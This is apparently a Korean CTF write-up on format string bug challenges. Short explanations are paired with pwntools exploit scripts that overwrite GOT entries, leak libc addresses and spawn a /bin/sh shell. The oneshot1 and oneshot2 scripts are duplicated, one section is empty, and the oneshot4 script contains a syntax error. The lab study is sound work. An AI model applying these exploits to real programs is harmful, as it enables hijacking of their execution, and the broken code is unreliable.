# fsb

## oneshot0

주어진 gift 함수를 실행하면 된다. PIE가 없고 partial RELRO이므로 fsb를 활용하여 exit 함수의 got를 gift함수의 주소로 덮어쓸 수 있다. gift 함수의 주소값이 크기 때문에 출력하는 것에 시간이 오래 걸리므로 %hn을 이용하여 2bytes씩 2회에 걸쳐 나누어서 입력할 수 있다. gift의 주소를 2부분으로 나눈 뒤 각각 exit+2와 exit에 입력할 수 있다. payload의 길이는 8의 배수여야 하므로 0x20으로 설정하면 offset은 6이지만 payload 길이로 인해 실제 입력하는 offset은 10과 11이 된다. payload를 보내면 exit_got를 gift로 변조할 수 있다.

```python

from pwn import *

# context.log_level = 'debug'

e = ELF("./oneshot")
p = process(e.path)


p.recvuntil(b"\n\n")
payload = f'%{e.symbols["gift"] >> 16}c'.encode() #gift_high
payload += b"%10$hn"
payload += f"%{(e.symbols['gift'] & 0xffff) - (e.symbols['gift'] >> 16)}c".encode() #gift_low - gift_high
payload += b"%11$hn"
payload = payload.ljust(0x20, b"\x00")
payload += p64(e.got["exit"] + 2)
payload += p64(e.got["exit"])
p.send(payload)

p.interactive()


```


## oneshot1

앞 문제와 다르게 system 함수만 주어져 있고 "/bin/sh"는 주어져 있지 않다. printf 함수의 got를 system 함수의 주소로 덮어쓰고 buf에 입력을 받을 때 "/bin/sh"를 입력하면 system("/bin/sh")를 실행할 수 있다. 이때 2번 이상 입력을 받아야 하므로 exit의 got를 main으로 덮어야 단계를 실행할 수 있을 것으로 보인다.  
payload 단계를 구성하면 다음과 같다.
1. exit_got을 main으로 덮는다.
2. libc_leak을 진행하여 system 함수의 주소를 구한다.
3. printf_got을 system으로 덮는다.
4. "/bin/sh"을 전송한다.


```python

from pwn import *

e = ELF('./oneshot2')
p = process(e.path)
libc = e.libc


main = e.symbols['main']
printf_got = e.got['printf']


main_low = main & 0xffff
main_high = (main >> 16) & 0xffff


p.recvuntil(b"\n\n")
payload = f'%{main_high}c'.encode()
payload += b'%10$hn'
payload += f'%{main_low - main_high}c'.encode()
payload += b'%11$hn'
payload = payload.ljust(0x20, b"\x00")
payload += p64(e.got["exit"] + 2)
payload += p64(e.got["exit"])

#pause()
p.send(payload)


p.recvuntil(b"\n\n")
payload = ''
payload += 'leak:%15$p'

#pause()
p.sendline(payload)

p.recvuntil('leak:')
leak = int(p.recv(14),16) 
#log.info('\tleak : '+ hex(leak))

libc_base = leak - libc.symbols['__libc_start_main'] - 231
system = libc_base + libc.symbols['system']

#log.info('\tlibc base '+ hex(libc_base))

system_low = system & 0xffff
system_middle = (system >> 16) & 0xffff
system_high = (system >> 32) & 0xffff

low = system_low

if system_middle > system_low:
    middle = system_middle - system_low
else:
    middle = 0x10000 + system_middle - system_low

if system_high > system_middle:
    high = system_high - system_middle
else:
    high = 0x10000 + system_high - system_middle


#log.info('[3] input : printf@got -> system')


p.recvuntil(b"\n\n")
payload = f'%{low}c'.encode()
payload += b'%11$hn'
payload += f'%{middle}c'.encode()
payload += b'%12$hn'
payload += f'%{high}c'.encode()
payload += b'%13$hn'
payload += b'\x00'*(8 - len(payload) % 8)
payload += p64(printf_got)
payload += p64(printf_got + 2)
payload += p64(printf_got + 4)


#pause()
p.send(payload)

#pause()
p.send(b'/bin/sh\x00')

p.interactive()


```



## oneshot2

system 함수와 "/bin/sh"가 주어져 있지 않으므로 libc_leak을 통해 구해서 풀어야 하는 문제로 보인다.
payload 단계를 구성하면 다음과 같다.
1. exit_got을 main으로 덮는다.
2. libc_leak을 진행하여 system 함수의 주소를 구한다.
3. printf_got을 system으로 덮는다.
4. "/bin/sh"을 전송한다.


```python

from pwn import *

e = ELF('./oneshot2')
p = process(e.path)
libc = e.libc


main = e.symbols['main']
printf_got = e.got['printf']


main_low = main & 0xffff
main_high = (main >> 16) & 0xffff


p.recvuntil(b"\n\n")
payload = f'%{main_high}c'.encode()
payload += b'%10$hn'
payload += f'%{main_low - main_high}c'.encode()
payload += b'%11$hn'
payload = payload.ljust(0x20, b"\x00")
payload += p64(e.got["exit"] + 2)
payload += p64(e.got["exit"])

#pause()
p.send(payload)


p.recvuntil(b"\n\n")
payload = ''
payload += 'leak:%15$p'

#pause()
p.sendline(payload)

p.recvuntil('leak:')
leak = int(p.recv(14),16) 
#log.info('\tleak : '+ hex(leak))

libc_base = leak - libc.symbols['__libc_start_main'] - 231
system = libc_base + libc.symbols['system']

#log.info('\tlibc base '+ hex(libc_base))

system_low = system & 0xffff
system_middle = (system >> 16) & 0xffff
system_high = (system >> 32) & 0xffff

low = system_low

if system_middle > system_low:
    middle = system_middle - system_low
else:
    middle = 0x10000 + system_middle - system_low

if system_high > system_middle:
    high = system_high - system_middle
else:
    high = 0x10000 + system_high - system_middle


#log.info('[3] input : printf@got -> system')


p.recvuntil(b"\n\n")
payload = f'%{low}c'.encode()
payload += b'%11$hn'
payload += f'%{middle}c'.encode()
payload += b'%12$hn'
payload += f'%{high}c'.encode()
payload += b'%13$hn'
payload += b'\x00'*(8 - len(payload) % 8)
payload += p64(printf_got)
payload += p64(printf_got + 2)
payload += p64(printf_got + 4)


#pause()
p.send(payload)

#pause()
p.send(b'/bin/sh\x00')

p.interactive()


```




## oneshot3

exit 함수가 존재하지 않으므로 다른 방식의 fsb를 해야 한다.






## oneshot4

전역변수 buf에 입력을 받는 상황이기 때문에 double-staged fsb를 해야 한다.  
ret의 주소와 37번째 입력값이 마지막 2바이트만 다르기 때문에 brute force를 통해 ret를 가리키도록 해야 할 것 같다.
브루트 포스를 하는 과정에서 ret와 libc_base를 알아낼 수 있다. 또한 스택과 관련이 없는 부분들은 무시하고 관련이 있는 부분들만 출력한다. 9번째에서 0x48로 길이를 맞춘 뒤 입력하고, 15번째 출력 과정에서 입력한 값(ret+0xe8)을 가지고 있는지 확인하고 아니면 다시 시작한다. 이후에 길이를 맞추고 main으로 다시 돌아가도록 한다. 마지막 바이트를 0x99로 변경한다.
이 과정을 통해 onegadget을 알 수 있을 것이고, 3회에 걸쳐 onegadget을 입력할 수 있다. 원하는 값을 계산하여 2바이트씩 길이를 맞추어 입력하면 된다.
도움을 받았음에도 매우 어려웠던 것 같다.


```python

from pwn import *

line=b''
while True:
    p=process("./oneshot4")
    p.recv(144)
    p.sendline("%8x%8x%8x%8x%8x%8x%p%10x%hn%8x%8x%8x%8x%2hhx%p%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%129x%hhn")
    line=p.recvline()
    two=int(line[0x74:0x78],16)
    if two==0x0130:
        break
    p.close()
    
libc_base=int(line[0x30:0x3e,16)-0x270b3
one_gadget=libc_base+0xe6c81

p.recvline()
p.recv(144)

payload=b'%p'*23+b'%65396x%hn'+b'%8x'*10+b'%'
payload+=str((one_gadget&0xffff)-0x9a).encode('utf-8')
payload+=b'x%hn%'
payload+=str(0x10000+((one_gadget>>16)&0xffff)-((one_gadget)&0xffff)).encode('utf-8')
payload+=b'x%hn\n'
payload+=b'\x00'*(0x100-len(payload))



p.sendline(payload)
p.recvline()
p.interactive()


```


